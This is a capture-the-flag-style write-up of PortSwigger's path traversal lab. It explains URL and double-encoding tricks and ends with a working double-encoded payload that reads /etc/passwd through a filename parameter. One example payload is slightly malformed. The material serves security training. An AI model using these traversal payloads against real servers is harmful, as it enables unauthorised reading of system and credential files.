## Welcome, my friend. Today we will start the [4. Path traversal lab](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode) in ```portswigger```

# Explain this Scenario:

### In some cases, such as when the path is used in a URL or in the filename parameter within a multipart/form-data request, servers may delete any cross-directory jump sequences before passing the input to the application. You can sometimes bypass this type of sanitization by using ```URL encoding``` or even ```double encoding``` of ```../``` symbols.


#### URL Encoding techniques

>URL Encoding

#### ```../``` becomes ```%2e%2e%2f```

### Double URL Encoding

#### ```../``` becomes ```%252e%252e%252f```

#### Non-standard encryptions

#### ```..%c0%af``` or ```..%ef%bc%8f``` may also work in some cases.

##### Use ```Burp Suite Pro``` to experiment with encryptions

#### For Burp Suite Professional users, Burp Intruder offers a preset list of payloads under the name Fuzzing - path traversal. This list contains some coded directory jump sequences you can try.


## Realistic scenario

#### Imagine that you are working on a web application that allows users to upload images. The application contains a mechanism to prevent ```../``` sequences. However, you can use encryption to bypass this mechanism:

##### If you send a request with the file parameter as follows

```
https://insecure-website.com/loadImage?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

Or using double encryption:

```
https://insecure-website.com/loadImage?filename=%252e%252e%252f%252e%252e%252e%252e%252fetc%252fpasswd
````

### You can bypass input sanitization and access sensitive file.

# Let'a play this lab:

#### First, we navigate inside the browser and search for all the existing parameters that we can benefit from, such as:

### We use the ```burp suite``` tool to help us intercept the request and modify it.

### Well, we have found ```filename``` parameter that may be affected by a vulnerability


##### The value of filename is ```49.jpg``` we will instead to ```../../../etc/passwd``` or ```/etc/passwd```


![image](https://github.com/user-attachments/assets/32ef3d0c-b625-417f-a906-579a1af668dd)

#### ok, No such file.

![image](https://github.com/user-attachments/assets/b72a69f2-98ea-487b-84a9-979deb542ace)


#### Also, No such file.

#### Let's try this:

```
....//....//....//etc/passwd
```

![image](https://github.com/user-attachments/assets/5c7b0fa2-fd00-4fbc-b491-2d78c73ae6bc)

#### Hmmm,Also no such file.

### Ok Let's try encoding this url in ```burp```. 

### ```../../../``` becomes ```%2e%2e%2f%2e%2e%2f%2e%2e%2f```

##### Let's try this:

```
%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
```

![image](https://github.com/user-attachments/assets/87223bd2-0eaa-4306-9f4a-f89f9cb19284)


### Ummm, Let's try with ```Double URL Encoding```.

### ```%2e%2e%2f%2e%2e%2f%2e%2e%2f``` becomes ```%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66```

![image](https://github.com/user-attachments/assets/07f18814-4054-455e-9612-7aa299f282e9)

##### Let's try this:

```
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd
```

### Great, we were able to access that sensitive file
